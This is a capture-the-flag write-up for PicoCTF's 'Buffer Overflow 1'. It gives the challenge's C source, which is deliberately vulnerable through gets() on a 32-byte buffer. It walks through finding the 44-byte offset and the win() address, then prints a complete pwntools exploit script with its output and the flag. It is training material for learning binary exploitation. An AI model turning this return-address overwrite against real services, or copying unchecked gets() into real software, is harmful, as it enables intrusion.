---
title: Buffer Overflow 1
categories: [writeups,PicoCTF]
tags: [pwn]
---


# Table of content
- [Table of content](#table-of-content)
- [Description](#description)
- [Code Given](#code-given)
- [Solution](#solution)
  - [exploit.py](#exploitpy)


# Description
> - Control the return address
> - Now we're cooking! You can overflow the buffer and return to the flag function in the program. 
> - connect with it using `nc saturn.picoctf.net 51800`


# Code Given
```c
include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include "asm.h"

#define BUFSIZE 32
#define FLAGSIZE 64

void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);

  printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```

# Solution
Based on the code given, we are suppose to trigger function `win` in order to get the flag. `gets` function is being used which mean we could perform buffer overflow attack and try to trigger `win` function.

```bash
nc saturn.picoctf.net 51800
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Okay, time to return... Fingers Crossed... Jumping to 0x41414141
```
We managed to confirmed that the program in vulnerable to buffer overflow. We will just need to get the correct buffer `A` and the value of `win` function to get the flag. 

```bash
python -c "print('A'*44)" | nc saturn.picoctf.net 51800
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x8049300

python -c "print('A'*48)" | nc saturn.picoctf.net 51800
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x41414141

objdump -t vuln | grep win
080491f6 g     F .text  0000008b              win
```
With the correct buffer and `win` value, we are able to retrieve the flag

``` bash
python exploit.py saturn.picoctf.net 50527                            
Starting Program ...

Please enter your string: 
<Sending Payload >
b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf6\x91\x04\x08\x00\x00\x00\x00'
<Payload Sent>
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
picoCTF{addr3ss3s_ar3_3asy_c76b273b}
Program Ended
--------------------------
|Binary Exploit Success!!|
--------------------------
```
## exploit.py
This is a simple python script to perform buffer overflow attacks
```python
#! /bin/python3
from sys import *
from pwn import *
from termcolor import colored
from os import *

# to remove all the noisy stuff that print out
pwnlib.args.SILENT(info)

check =  len(sys.argv)
if check <= 1 :
    print("usage:python exploit.py host port")
    print("eg: python exploit.py 127.0.0.1 1234")
    sys.exit()

host=sys.argv[1]
port=sys.argv[2]
p = remote(host,port)

e = ELF("vuln") # change vuln to your own program and absolute path is possible
number = p64(e.symbols["win"])

# set buffer overflow 
buffer_overflow = b'A'*44
payload = buffer_overflow
payload += number

print(colored("Starting Program ...\n","blue"))
print(p.recvline(keepends = False ).decode("utf-8"))

print(colored("<Sending Payload >","cyan"))
print(payload)
print(colored("<Payload Sent>","cyan"))

# This is where the payload is sent
p.sendline(payload)

output = p.recvallS()
print(output)
p.close()
print(colored("Program Ended","blue"))

# This is where the result
if "picoCTF" in output:
    print(colored("--------------------------","green"))
    print(colored("|Binary Exploit Success!!|","green"))
    print(colored("--------------------------","green"))
    
else:
    print(colored("-----------------------","red"))
    print(colored("|Binary Exploit Failed|","red"))
    print(colored("-----------------------","red"))
```